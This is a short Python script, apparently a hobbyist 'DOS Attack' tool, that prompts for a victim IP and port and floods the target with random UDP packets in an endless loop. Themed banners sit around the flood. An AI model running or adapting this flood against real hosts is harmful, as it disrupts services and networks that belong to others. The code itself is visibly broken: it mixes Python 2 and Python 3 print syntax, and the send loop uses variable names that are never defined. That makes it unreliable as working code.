import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DOS Attack ")

print("\n")
print("  🔥 A project by: FLASHbOY8")
print("  📎 GitHub      : https://github.com/FLASHbOY8\n")

print("  The lights flicker... a chill runs down the cable spine.")
print("  You've opened the gateway to the nether-net.")
print("  Beware... for what you unleash may echo through firewalls eternal.\n")

# Target info
target_ip = input("💀 Enter Victim IP        : ")
target_port = int(input("💣 Enter Starting Port    : "))

os.system("clear")
os.system("figlet 'Blacksquad'")
os.system("figlet 'Attack Starting'")
os.system("echo '       ]===> I am the Boss now <===['")
print " \n"
print "[                     ] 0% "
time.sleep(5)
print "[=====>               ] 25%"
time.sleep(5)
print "[==========>          ] 50%"
time.sleep(5)
print "[===============>     ] 75%"
time.sleep(5)
print "[====================>] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1 
